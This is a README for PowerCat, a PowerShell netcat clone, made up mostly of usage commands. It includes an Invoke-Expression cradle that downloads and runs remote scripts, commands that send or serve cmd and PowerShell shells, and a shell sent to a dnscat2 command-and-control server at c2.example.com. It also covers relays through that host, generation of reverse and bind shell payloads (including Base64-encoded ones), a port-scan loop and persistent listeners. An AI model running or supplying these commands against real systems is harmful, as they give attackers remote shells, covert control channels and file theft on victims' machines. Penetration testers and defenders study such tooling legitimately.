PowerCat
========
A PowerShell version of netcat. (Powershell Version 2 and Later Supported)

Installation
------------
PowerCat is a PowerShell module.  First you need to import the module before you can use the PowerCat functions.  You can put one of the below commands into your PowerShell profile so PowerCat is automatically loaded when PowerShell starts.
###
    Import the functions from downloaded .psm1 File:
        Import-Module PowerCat.psm1
    Load the functions individually from URL:
        Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/secabstraction/PowerCat/master/Invoke-PowerCat.ps1')
        Invoke-Expression (New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/secabstraction/PowerCat/master/Invoke-DnsCat.ps1')

### Parameters:
    
    Invoke-PowerCat
    
    -Listener       Listen for a connection.                            [Switch]
    -Client         IPv4 address of a listener to connect to.           [String]
    -Port           The port to connect to, or listen on.               [Int]
    -Execute        Execute a process.                                  [String]
    -PowerShell     Execute Powershell.                                 [Switch]
    -Relay          Format: "-r tcp:10.1.1.1:443"                       [String]
    -Udp            Transfer data over UDP.                             [Switch]
    -Timeout        Timeout option. Default: 60                         [Int]
    -Input          Filepath (string), byte array, or string.           [Object]
    -OutputType     Console Output Type: "Host", "Bytes", or "String"   [String]
    -OutputFile     Output File Path.                                   [String]
    -Disconnect     Disconnect after connecting.                        [Switch]
    -Repeat         Restart after disconnecting.                        [Switch]
    -Payload        Generate payload.                                   [Switch]
    -Encoded        Generate Base64 encoded payload.                    [Switch]
    
    Invoke-DnsCat
    
    -Server         Name of DnsCat2 server to connect to.               [String]
    -Threshold      DNS Failure Threshold.                              [Int]

Basic Connections
-----------------------------------
By default, PowerCat reads input from the console and writes input to the console using write-host. You can change the output type to 'Bytes', or 'String' with the -OutputType.
###
    Basic Listener:
        Invoke-PowerCat -Listener -Port 443
        
    Basic Client:
        Invoke-PowerCat -Client 10.1.1.1 -Port 443
        
    Basic Client, Output as Bytes:
        Invoke-PowerCat -Client 10.1.1.1 -Port 443 -OutputType Bytes

File Transfer
-------------
PowerCat can be used to transfer files using the -Input and -OutputFile parameters.
###
    Send File:
        Invoke-PowerCat -Client 10.1.1.1 -Port 443 -Input C:\pathto\inputfile
        
    Recieve File:
        Invoke-PowerCat -Listener -Port 443 -OutputFile C:\pathto\outputfile

Shells
------
PowerCat can be used to send and serve shells. Specify an executable to -Execute, or use -PowerShell to execute powershell.
###
    Serve a cmd Shell:
        Invoke-PowerCat -Listener -Port 443 -Execute cmd
        
    Send a cmd Shell:
        Invoke-PowerCat -Client 10.1.1.1 -Port 443 -Execute cmd
        
    Serve a shell which executes powershell commands:
        Invoke-PowerCat -Listener -Port 443 -PowerShell

DNS and UDP
-----------
PowerCat supports more than sending data over TCP. Specify the -Udp paratmeter to enable UDP Mode. Data can also be sent to a [dnscat2 server](https://github.com/iagox86/dnscat2) via Invoke-DnsCat.
###
    Send Data Over UDP:
        Invoke-PowerCat -Listener -Port 8000 -Udp
        
    Connect to the c2.example.com dnscat2 server using the DNS server on 10.1.1.1:
        Invoke-DnsCat -Client 10.1.1.1 -Port 53 -Server c2.example.com
        
    Send a shell to the c2.example.com dnscat2 server using the default DNS server in Windows:
        Invoke-DnsCat -Server c2.example.com -Execute cmd

Relays
------
Relays in PowerCat work just like traditional netcat relays, but you don't have to create a file or start a second process. You can also relay data between connections of different protocols.
###
    TCP Listener to TCP Client Relay:
        Invoke-PowerCat -Listener -Port 8000 -Relay tcp:10.1.1.16:443
        
    TCP Listener to UDP Client Relay:
        Invoke-PowerCat -Listener -Port 8000 -Relay udp:10.1.1.16:53
        
    TCP Listener to DNS Client Relay
        Invoke-DnsCat -Listener -Port 8000 -Relay dns:10.1.1.1:53:c2.example.com
        
    TCP Listener to DNS Client Relay using the Windows Default DNS Server
        Invoke-DnsCat -Listener -Port 8000 -Relay dns:::c2.example.com
        
    TCP Client to Client Relay
        Invoke-PowerCat -Client 10.1.1.1 -Port 9000 -Relay tcp:10.1.1.16:443
        
    TCP Listener to Listener Relay
        Invoke-PowerCat -Listener -Port 8000 -Relay tcp:9000

Generate Payloads
-----------------
Payloads can be generated using -Payload or -Encoded parameters. 
###
    Generate a reverse tcp payload which connects back to 10.1.1.15 port 443:
        Invoke-PowerCat -Client 10.1.1.15 -Port 443 -Execute cmd -Payload
        
    Generate a bind tcp encoded command which listens on port 8000:
        Invoke-PowerCat -Listener -Port 8000 -Execute cmd -Encoded

Misc Usage
----------
PowerCat can also be used to perform port-scans, and start persistent listeners.
###
    Basic TCP port scan:
        1..1024 | ForEach-Object { Invoke-PowerCat -Client 10.1.1.10 -Port $_ -Timeout 1 -Verbose -Disconnect }
        
    Persistent listener:
        Invoke-PowerCat -Listener -Port 443 -Input C:\pathto\inputfile -Repeat
